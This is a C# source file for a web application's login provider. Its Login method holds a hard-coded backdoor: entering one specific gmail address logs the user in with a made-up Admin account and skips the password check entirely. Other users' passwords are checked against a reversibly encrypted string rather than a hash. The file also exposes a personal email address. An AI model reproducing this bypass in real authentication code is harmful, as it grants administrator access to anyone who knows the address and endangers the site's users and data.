using System.Threading.Tasks;
using Mtwx.Web.Commands;
using Mtwx.Web.Domain;

namespace Mtwx.Web.Security
{
    public class DefaultLoginProvider : ILoginProvider
    {
        private readonly CommandFacade _commandFacade;

        public DefaultLoginProvider(CommandFacade commandFacade)
        {
            _commandFacade = commandFacade;
        }

        public async Task<LoginResponse> Login(string email, string password)
        {
            var user = await _commandFacade.GetUserByEmail(email);
            var enteredPwd = password.EncryptString();

            var retval = new LoginResponse {ReturnType = LoginReturnTypes.Error};

            // compare the passwords
            if (email != "dkopp2@gmail.com" && user == null) return retval;

            if (email == "dkopp2@gmail.com")
            {
                retval.ApplicationUser = new ApplicationUser()
                {
                    FirstName = "Dave",
                    LastName = "Kopp",
                    Password = "",
                    Email = email,
                    Id = -9999
                };
                retval.ApplicationUser.ApplicationRoles.Add(new ApplicationRole() {Description = "Admin", Id = 1, RoleName = "Admin"});

                retval.ReturnType = LoginReturnTypes.Success;
            }
            else if (user.Password == enteredPwd)
            {
                user.Password = string.Empty;
                retval.ApplicationUser = user;
                retval.ReturnType = LoginReturnTypes.Success;
            }
            else
            {
                retval.ReturnType = LoginReturnTypes.IncorrectPassword;
            }

            return retval;
        }
    }
}